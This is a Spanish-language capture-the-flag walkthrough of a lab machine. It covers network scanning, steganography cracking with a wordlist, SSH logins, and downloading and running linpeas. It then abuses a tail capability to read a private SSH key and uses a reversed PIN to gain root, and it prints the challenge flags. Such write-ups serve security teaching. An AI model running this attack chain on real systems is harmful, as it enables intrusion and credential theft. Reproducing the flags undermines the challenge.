
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.33 -oN escaneo
wget http://10.0.2.33/cat-original.jpg
wget http://10.0.2.33/cat-hidden.jpg
stegseek --crack cat-hidden.jpg /usr/share/wordlists/rockyou.txt out.txt
cat out.txt
ssh mateo@10.0.2.33 -p 2222
wget http://10.0.2.33/gogogo.wav
nano id_rsa
ssh bonita@10.0.2.33 -i id_rsa
wget http://10.0.2.33:8080/beroot
```
Primero de todo realizamos un arp-scan para encontrar la IP y una vez tengamos su IP realizamos un nmap y vemos que están abiertos los puertos 2222 en el que corre un servicio ssh y 80.
![[Pasted image 20240311232116.png]]
Ahora entramos al servicio web y vemos dos imágenes de gatos que procedemos a descargárnosla en local.
![[Pasted image 20240311232244.png]]
Ahora intentaremos hacer esteganografía a la imagen hidden así que usaremos la herramienta de stegseek que es la más moderna y eficiente que nos sacará un fichero llamado mateo.txt con una contraseña.
![[Pasted image 20240311233826.png]]
Ahora entraremos con el usuario mateo y la contraseña proporcionada por el stegseek y leemos el archivo que redirige a un audio en el que debe de estar oculta la flag de user
![[Pasted image 20240311234655.png]]
```shell
cat note.txt
cd /home/markus
cat note.txt
python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
sh linpeas.sh
tail -n 100000 /var/cache/apt/id_rsa
cat user.txt
python3 -m http.server 8080
./beroot
cat /root/root.txt
```
Ahora nos descargamos el audio debido a que se encuentra en el servidor http de la máquina para crackearlo, pero vemos que se trata de codigo morse así que uso la siguiente página para desencriptarlo pero obtengo un mensaje extraño.
![[Pasted image 20240311235631.png]]
Ahora volvemos a la máquina y haciendo un cat al fichero passwd vemos que existen los usuarios markus y bonita.
![[Pasted image 20240311235719.png]]
Como no encontramos nada hacemos otro stegseek a la otra imagen que nos descargamos al inicio y encuentro las credenciales de markus.
![[Pasted image 20240312000309.png]]
Así que ahora inicio sesión como markus en la máquina víctima y al ver la nota que hay en el fichero home de marcus busco el id_rsa de bonita pero al intentar entrar me pone que no tengo permisos tanto como markus como con mateo.
![[Pasted image 20240312000638.png]]
Entonces como no encontramos nada mas nos descargamos linpeas para ver posibles escaladas de privilegios y lo ejecutamos y enontramos una capability de el comando tail
![[Pasted image 20240312001457.png]]
Y aprovechándonos de eso podemos leer el id_rsa de bonita para copiarlo en nuestra máquina local y así conseguir la flag de user.
![[Pasted image 20240312002129.png]]
Ahora nos descargaremos en local el programa beroot y usamos ghidra para analizar el código y encontramos el pin válido para el programa beroot
![[Pasted image 20240312003512.png]]
Finalmente logramos ser el usuario root mediante el código 0x16f8
![[Pasted image 20240312003740.png]]

Flag de user: HMVblackcat
Flag de root: HMVwhereismycat